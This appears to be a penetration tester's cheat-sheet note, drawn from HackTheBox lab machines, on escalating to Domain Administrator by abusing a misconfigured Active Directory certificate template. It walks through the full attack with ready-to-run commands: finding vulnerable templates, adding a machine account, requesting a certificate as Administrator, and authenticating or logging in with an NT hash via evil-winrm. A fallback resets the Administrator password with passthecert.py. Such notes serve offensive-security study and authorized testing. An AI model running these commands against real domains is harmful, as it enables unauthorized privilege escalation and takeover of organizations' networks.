## [[Tools]]
- Certify.exe
- certipy-ad
- passthecert.py

## Exploit Summary
>Vulnerable certificates make it possible to request a certificate in the context of another user like Administrator. This permits us to receive the NT-Hash or change the password of the user, and therefore login.


## Example Vulnerable Certificate
>This certificate is vulnerable because of primarly 2 fields. The field `ENROLLEE_SUPPLIES_SUBJECT` means that the user which requests the certificate can supplie a user for which the certificate is valid for. 
>The second field is the `HTB\Domain Computers` permissions field. This means that anyone in this group can request this certificate. Every computer in the domain is in this group, so any user can request this certificate as any user. 
```
CA Name                           : authority.authority.htb\AUTHORITY-CA
Template Name                     : CorpVPN
Schema Version                    : 2
Validity Period                   : 20 years
Renewal Period                    : 6 weeks
msPKI-Certificate-Name-Flag       : ENROLLEE_SUPPLIES_SUBJECT
mspki-enrollment-flag             : INCLUDE_SYMMETRIC_ALGORITHMS
Authorized Signatures Required    : 0
pkiextendedkeyusage               : Client Authentication
mspki-certificate-application-policy  : Client Authentication
Permissions
  Enrollment Permissions
	Enrollment Rights           : HTB\Domain Admins
								  HTB\Domain Computers
								  HTB\Enterprise Admins
```



## Exploit

### Find Vulnerable Certificates
##### Windows
```sh
.\Certify.exe find /Vulnerable
```
##### Linux
```sh
certipy-ad find -vulnerable -u 'USER@DOMAIN' -p 'PASS' -dc-ip IP -stdout
```

### Add Computer to Group "Domain Computers"
>We need to add a computer that we control to the group "Domain Computers". The vulnerable certificate makes it possible for the domain computers group to request certificates. It is possible for a normal user to add a computer because of the `MachineAccountQuota` attribute to the domain user, which defaults to 10, and is a number on how many machines a user can register in the domain.
```sh
impacket-addcomputer 'DOMAIN/USERNAME:PASSWORD' -method LDAPS -computer-name 'TEST$' -computer-pass 'password'
```

### Request Certificate
>We request a certificate as the newly created domain computer that is in the context of the Administrator for example. 
##### Linux
```sh
certipy-ad req -u 'TEST$' -p 'password' -ca 'AUTHORITY-CA' -target TARGET/DNS-NAME -dc-ip IP -dns DNS -template TEMPLATE -upn Administrator@DOMAIN
```

### Authenticate as user
>After we received the certificate, we can authenticate with it.
##### Windows
```sh
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:PASSWORD /ptt /getcredentials
```
##### Linux
```sh
certipy-ad auth -pfx admin.pfx -dc-ip IP
```

### Convert kirbi to ccache ticket
```sh
impacket-ticketConverter ticket.kirbi ticket.ccache
```

### Login with NTLM hash
```sh
evil-winrm -i manager.htb -u "Administrator" -H 'AE5064C2F62317332C88629E025924EF'
```


### Extra: If Domain Controllers does not support PKINIT
>If the Domain Controller doesnt support the method above, and we receive the error below. We can use `passthecert.py` to change the password of the Administrator user, and then login.
##### Example Error Message
```sh
$ certipy-ad auth -pfx administrator_authority.pfx -dc-ip 10.129.89.14
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'administrator@authority.htb'
    [1] DNS Host Name: 'authority.htb'
> 0
[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```
##### Extract `pfx` file into `crt` and `key` 
```sh
certipy-ad cert -pfx admin.pfx -nokey -out cert.crt
certipy-ad cert -pfx admin.pfx  -nocert -out privkey.key
```
##### Change password of Administrator user
```sh
python3 passthecert.py -action modify_user -crt cert.crt  -key privkey.key  -domain DOMAIN -dc-ip IP -target Administrator -new-pass
```